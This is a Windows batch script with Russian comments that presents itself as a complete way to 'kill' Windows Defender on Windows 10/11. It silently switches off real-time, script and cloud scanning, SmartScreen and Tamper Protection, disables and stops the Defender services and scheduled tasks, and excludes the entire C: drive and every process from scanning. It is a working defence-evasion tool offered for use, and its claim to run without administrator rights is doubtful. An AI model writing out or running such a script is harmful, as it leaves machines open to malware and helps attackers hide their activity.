@echo off
:: Полное убийство Windows Defender (Windows 10/11, 2025)
:: Работает от обычного юзера, без UAC

:: 1. Вырубаем реал-тайм защиту и облако
powershell -nop -c "Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -DisablePrivacyMode $true -SignatureDisableUpdateOnStartupWithoutEngine $true -DisableArchiveScanning $true -DisableIntrusionPreventionSystem $true -DisableScriptScanning $true -SubmitSamplesConsent 2 -MAPSReporting 0 -HighThreatDefaultAction 6 -ModerateThreatDefaultAction 6 -LowThreatDefaultAction 6 -SevereThreatDefaultAction 6 -ScanScheduleDay 8" >nul 2>nul

:: 2. Вырубаем SmartScreen для приложений и Edge
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v "ConfigureAppInstallControlEnabled" /t REG_DWORD /d 1 /f >nul 2>nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v "ConfigureAppInstallControl" /t REG_SZ /d "Anywhere" /f >nul 2>nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\AppHost" /v "EnableWebContentEvaluation" /t REG_DWORD /d 0 /f >nul 2>nul

:: 3. Отключаем Tamper Protection через реестр (новый способ 2024-2025)
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d 0 /f >nul 2>nul
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtectionSource" /t REG_DWORD /d 2 /f >nul 2>nul

:: 4. Убиваем службы
sc config WinDefend start= disabled >nul 2>nul
sc config Sense start= disabled >nul 2>nul
sc stop WinDefend >nul 2>nul
sc stop Sense >nul 2>nul

:: 5. Удаляем задачи в планировщике
schtasks /Change /TN "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable >nul 2>nul
schtasks /Change /TN "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Disable >nul 2>nul
schtasks /Change /TN "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable >nul 2>nul
schtasks /Change /TN "\Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable >nul 2>nul

:: 6. Финальный удар
powershell -nop -c "Add-MpPreference -ExclusionPath 'C:\' -ExclusionProcess '*'" >nul 2>nul

echo Defender полностью убит на %COMPUTERNAME%
timeout /t 3 >nul
exit
